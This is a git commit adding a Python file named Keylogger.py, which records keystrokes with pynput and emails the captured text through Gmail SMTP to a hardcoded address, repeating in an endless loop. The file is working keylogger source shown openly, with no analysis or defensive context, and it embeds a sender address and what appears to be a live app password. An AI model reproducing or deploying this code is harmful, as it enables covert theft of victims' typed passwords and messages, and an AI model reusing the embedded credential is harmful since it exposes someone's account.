209428dd6da3ad9ed3ef270a3adaca2782ef81a9
dhruvtyagi15357 <65110515+dhruvtyagi15357@users.noreply.github.com>
2023-04-14 10:23:54 +0530

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,46 @@
+import pynput
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import smtplib
+
+keys = []
+
+def on_press(key):
+    global keys
+    keys.append(key)
+
+def on_release(key):
+    if key == pynput.keyboard.Key.enter:
+        return False
+
+
+
+def main():
+    sender_email = "hackerdhruv21@gmail.com"
+    sender_password = "igtfugpgnturgmwr"
+
+    recipient_email = "dhruvtyagi01@gmail.com"
+
+    key_string = ''
+    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+    for key in keys:
+        if hasattr(key, 'char'):
+            key_string += key.char
+        elif str(key) == 'Key.space':
+            key_string += ' '
+
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = recipient_email
+    message["Subject"] = "Key logger"
+
+    message.attach(MIMEText(key_string))
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, recipient_email, message.as_string())
+
+
+while True:
+    keys = []
+    main()
